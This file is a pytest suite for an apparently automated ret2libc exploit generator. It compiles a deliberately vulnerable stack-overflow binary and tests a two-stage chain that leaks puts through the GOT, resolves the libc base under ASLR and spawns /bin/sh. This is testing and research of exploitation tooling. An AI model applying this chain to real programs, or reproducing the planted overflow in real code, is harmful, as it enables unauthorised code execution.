"""ret2libc with a runtime puts() leak: defeat ASLR without a `system` PLT entry, on a no-PIE
x86-64 target that imports puts but not system. The pure primitives (libc symbol/GOT reading,
base resolution, the leak-stage builder) are unit-tested; the two-stage harness is proven
end-to-end by spawning a real shell that echoes a marker."""
import glob
import shutil
import struct
import subprocess

import pytest

from lykos.analyze.poc import leak, rop

_SYS_LIBC = next(iter(glob.glob("/usr/lib/x86_64-linux-gnu/libc.so.6")
                      + glob.glob("/lib/x86_64-linux-gnu/libc.so.6")
                      + glob.glob("/usr/lib/libc.so.6")), None)


def test_libc_symbols_and_got_match_readelf():
    """The stdlib dynsym/reloc readers agree with readelf on a real libc + a compiled binary."""
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    data = open(_SYS_LIBC, "rb").read()
    syms = rop.libc_symbols(data, ("puts", "system", "read"))
    assert set(syms) == {"puts", "system", "read"} and all(v > 0 for v in syms.values())
    # cross-check one against readelf --dyn-syms
    if shutil.which("readelf"):
        out = subprocess.run(["readelf", "--dyn-syms", _SYS_LIBC], capture_output=True,
                             text=True).stdout
        for ln in out.splitlines():
            p = ln.split()
            if len(p) >= 8 and p[7].split("@")[0] == "system" and "FUNC" in ln:
                assert syms["system"] == int(p[1], 16)
                break
    assert rop.find_string(data, b"/bin/sh")            # "/bin/sh" is present in libc
    # a real libc base is page-aligned; the resolver rejects a non-aligned "leak"
    assert rop.resolve_libc_base(0x7f1234500000 + syms["puts"], syms["puts"]) == 0x7f1234500000
    assert rop.resolve_libc_base(0x7f1234500123 + syms["puts"], syms["puts"]) is None


def test_build_leak_puts_structure():
    p = rop.build_leak_puts(40, pop_rdi=0x401176, got=0x404000, puts_plt=0x401060,
                            ret_to=0x4011ac)
    q = lambda o: struct.unpack_from("<Q", p, o)[0]     # noqa: E731
    assert q(40) == 0x401176 and q(48) == 0x404000 and q(56) == 0x401060 and q(64) == 0x4011ac


@pytest.fixture
def r2l_bin(tmp_path_factory):
    from lykos.analyze.dynamic import sandbox
    if sandbox.host_arch() != "x86-64":
        pytest.skip("ret2libc fixture is x86-64 native only")
    if not _SYS_LIBC:
        pytest.skip("no system libc to resolve offsets from")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp("r2l")
    (d / "v.c").write_text(
        '#include <stdio.h>\n#include <unistd.h>\n'
        # a pop rdi;ret gadget the tiny binary would otherwise lack (a solvable target provides it)
        '__asm__(".text\\n.global g\\n g: pop %rdi\\n ret\\n");\n'
        'void vuln(void){ char b[32]; puts("go"); read(0,b,400); }\n'
        'int main(void){ setvbuf(stdout,0,2,0); while(1) vuln(); return 0; }\n')
    exe = d / "v"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-w",
                       str(d / "v.c"), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build ret2libc fixture")
    return exe


def test_ret2libc_leak_spawns_a_shell(r2l_bin):
    """End-to-end: a no-PIE binary that imports puts (not system) and runs under ASLR is exploited
    to a real shell by leaking libc via puts(), resolving the base, and calling system("/bin/sh")."""
    exe = r2l_bin
    data = exe.read_bytes()
    pop_rdi = rop.find_gadget(data, "pop_rdi")
    puts_plt = rop.resolve_plt(str(exe), "puts")
    puts_got = rop.got_entry(data, "puts")
    ret_align = rop.find_gadget(data, "ret")
    assert pop_rdi and puts_plt and puts_got, "fixture address resolution failed"
    nm = subprocess.run(["nm", str(exe)], capture_output=True, text=True).stdout
    main = next((int(l.split()[0], 16) for l in nm.splitlines() if l.endswith(" T main")), None)
    assert main
    ld = open(_SYS_LIBC, "rb").read()
    syms = rop.libc_symbols(ld, ("puts", "system"))
    binsh_off = rop.find_string(ld, b"/bin/sh")
    assert syms.get("puts") and syms.get("system") and binsh_off

    res = leak.ret2libc_leak(exe, exe.parent, offset=40, pop_rdi=pop_rdi, puts_plt=puts_plt,
                             puts_got=puts_got, ret_to=main, ret_gadget=ret_align,
                             puts_off=syms["puts"], system_off=syms["system"], binsh_off=binsh_off,
                             timeout=8.0)
    assert res["ok"], f"ret2libc did not confirm a shell: {res.get('reason')} (leaked={res.get('leaked')})"
    assert res["base"] % 0x1000 == 0                     # a real, page-aligned libc base was recovered
